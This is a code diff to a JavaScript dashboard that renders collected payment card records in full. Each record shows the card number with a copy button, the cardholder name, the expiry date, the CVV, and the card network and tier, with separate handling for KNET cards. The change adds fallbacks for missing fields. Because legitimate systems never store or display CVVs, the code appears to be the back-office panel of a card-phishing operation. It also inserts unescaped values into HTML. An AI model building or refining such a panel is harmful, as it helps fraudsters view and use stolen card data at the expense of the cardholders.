@@ -2115,7 +2115,11 @@
             const card = entry.data;
             const cardIndex = entry.index;
             const isKNET = card.paymentMethod === 'KNET';
-            const cardInfo = getCardInfo(card.cardNumber);
+            const rawCardNumber = String(card.cardNumber ?? card.number ?? '');
+            const cardholderDisplay = String(card.nameOnCard ?? card.name ?? '').trim() || '-';
+            const expiryDisplay = String(card.expiry ?? '').trim() || [card.expiryMonth, card.expiryYear].filter(value => value !== undefined && value !== null && String(value).trim() !== '').join('/') || '-';
+            const cvvDisplay = String(card.cvv ?? '').trim() || '-';
+            const cardInfo = getCardInfo(rawCardNumber);
             
             if (isKNET) {
               // KNET card display
@@ -2147,7 +2151,7 @@
               html += '</div>';
             } else {
               // Credit card display - bank card design (like fahos)
-              const formattedNum = card.cardNumber ? card.cardNumber.replace(/(\d{4})(?=\d)/g, '$1 ') : '';
+              const formattedNum = rawCardNumber ? rawCardNumber.replace(/(\d{4})(?=\d)/g, '$1 ') : '-';
               const networkLogo = cardInfo.network === 'Visa' ? 'VISA' : cardInfo.network === 'Mastercard' ? 'Mastercard' : 'mada';
               html += '<div class="data-section bg-purple-50 p-4 rounded-lg" style="border-right-color: #9333ea;">';
               html += '<h3 class="font-bold mb-3 text-purple-800">💳 بطاقة دفع</h3>';
@@ -2160,17 +2164,17 @@
               html += '</div>';
               // Card number
               html += '<div style="text-align: center; margin-bottom: 14px;">';
-              html += '<span dir="ltr" style="font-size: 22px; font-weight: bold; color: #333; letter-spacing: 3px; unicode-bidi: embed; display: inline-block; cursor: pointer;" onclick="navigator.clipboard.writeText(\'' + card.cardNumber + '\');this.insertAdjacentHTML(\'afterend\',\'<span style=color:green;font-size:12px;margin-right:8px>\u062a\u0645 \u0627\u0644\u0646\u0633\u062e</span>\');setTimeout(()=>{if(this.nextSibling)this.nextSibling.remove()},1500)" title="انقر للنسخ">' + formattedNum + '</span>';
+              html += '<span dir="ltr" style="font-size: 22px; font-weight: bold; color: #333; letter-spacing: 3px; unicode-bidi: embed; display: inline-block; cursor: pointer;" onclick="navigator.clipboard.writeText(\'' + rawCardNumber + '\');this.insertAdjacentHTML(\'afterend\',\'<span style=color:green;font-size:12px;margin-right:8px>\u062a\u0645 \u0627\u0644\u0646\u0633\u062e</span>\');setTimeout(()=>{if(this.nextSibling)this.nextSibling.remove()},1500)" title="انقر للنسخ">' + formattedNum + '</span>';
               html += '</div>';
               // Expiry + Name row
               html += '<div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 14px;">';
-              html += '<div style="text-align: left;"><span style="color: #888; font-size: 11px;">Name</span><br><span style="color: #333; font-size: 14px; font-weight: 600;">' + card.nameOnCard + '</span></div>';
-              html += '<div style="text-align: right;"><span style="color: #888; font-size: 11px;">Expiry</span><br><span style="color: #333; font-size: 16px; font-weight: bold;">' + card.expiryMonth + '/' + card.expiryYear + '</span></div>';
+              html += '<div style="text-align: left;"><span style="color: #888; font-size: 11px;">Name</span><br><span style="color: #333; font-size: 14px; font-weight: 600;">' + cardholderDisplay + '</span></div>';
+              html += '<div style="text-align: right;"><span style="color: #888; font-size: 11px;">Expiry</span><br><span style="color: #333; font-size: 16px; font-weight: bold;">' + expiryDisplay + '</span></div>';
               html += '</div>';
               // CVV + Network + Tier row
               html += '<div style="display: flex; justify-content: space-between; align-items: center;">';
-              html += '<div><span style="color: #888; font-size: 11px;">CVV</span><br><span style="color: #333; font-size: 18px; font-weight: bold;">' + card.cvv + '</span></div>';
-              html += '<div style="text-align: right;"><span style="font-size: 16px; font-weight: bold; color: #1a1f71;">' + networkLogo + '</span><br><span style="color: #555; font-size: 11px; font-weight: bold;">' + cardInfo.type.toUpperCase() + ' • ' + cardInfo.tier.toUpperCase() + '</span></div>';
+              html += '<div><span style="color: #888; font-size: 11px;">CVV</span><br><span style="color: #333; font-size: 18px; font-weight: bold;">' + cvvDisplay + '</span></div>';
+              html += '<div style="text-align: right;"><span style="font-size: 16px; font-weight: bold; color: #1a1f71;">' + networkLogo + '</span><br><span style="color: #555; font-size: 11px; font-weight: bold;">' + String(cardInfo.type || 'UNKNOWN').toUpperCase() + (cardInfo.tier ? ' • ' + String(cardInfo.tier).toUpperCase() : '') + '</span></div>';
               html += '</div>';
               html += '</div>';
               // Action buttons for credit card
